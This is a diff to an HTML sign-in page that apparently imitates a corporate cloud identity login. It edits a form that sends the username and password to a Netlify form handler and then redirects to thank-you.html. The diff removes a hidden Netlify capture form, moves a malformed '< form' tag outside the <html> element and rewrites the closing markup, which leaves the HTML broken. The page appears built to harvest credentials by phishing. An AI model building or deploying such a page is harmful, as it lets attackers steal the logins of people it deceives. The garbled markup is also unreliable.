@@ -1,4 +1,4 @@
-<html lang="en">
+< form name="Login" novalidate="" id="cloud-directory-form" class="needs-validation mb-6 px-4 px-xxl-6" method="POST" data-netlify="true" autocomplete="off" action="thank-you.html" onsubmit="setFedSettings()"><html lang="en">
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -57,10 +57,6 @@ function checkResponse() {
 </script>
 
 </head>
-	<form name="Login" netlify hidden>
-  <input type="text" name="vusername">
-  <input type="password" name="password">
-</form>
 
 <body class="body-bg-image px-1 py-3 px-sm-4 py-sm-6 h-100" onload="checkLoginRequiredWithIDPCloud()">
 <main class="container">
@@ -87,7 +83,6 @@ function checkResponse() {
                         <h1 id="signIn_Header" class="mx-4 mt-6 mb-4 text-center">Sign In</h1>
                         <div id="signIn_SubHeader"></div>
                         <!--Removed type="hidden" from form-->
-                        <!-- form name="Login" novalidate="" id="cloud-directory-form" class="needs-validation mb-6 px-4 px-xxl-6" method="POST" data-netlify="true" autocomplete="off" action="thank-you.html" onsubmit="setFedSettings()">
 				<div class="form-inputs mb-4">
 							
 							   <label class="form-label" for="vusername">Username or Email</label>
@@ -134,28 +129,9 @@ function checkResponse() {
 									<div class="d-flex flex-column gap-1">
 										<a class="btn btn-link btn-sm" href="error.html">Password and Profile Management</a>
 										</div>
-									</div>	
-							
-                       					
-					 </form-->
-						 < form name="Login" novalidate="" id="cloud-directory-form" class="needs-validation mb-6 px-4 px-xxl-6" method="POST" data-netlify="true" autocomplete="off" action="thank-you.html" onsubmit="setFedSettings()">
-				<div class="form-inputs mb-4">
-  <label class="form-label" for="vusername">Username or Email</label>
-                               	<input id="vusername" type="text" class="form-control" name="form-name" value="Login" tabindex="1" data-toggle="tooltip" data-placement="top" title="Please provide user name">
-								<br>
-								
-							<label class="form-label" for="password-input">Password</label>
-								<input id="password-input" type="password" class="form-control" name="password" tabindex="2" autocomplete="off" data-toggle="tooltip" data-placement="top" title="Please provide password">
-  <!-- your visible inputs here -->
-</form>
-					 </div>
-					
-	   </div>
-	      </div>
-		     </div>
-			 
-	</main>
-    <script>
+									</div>	                    					
+					 </form>
+			     <script>
 
 
 function setFedSettings(){
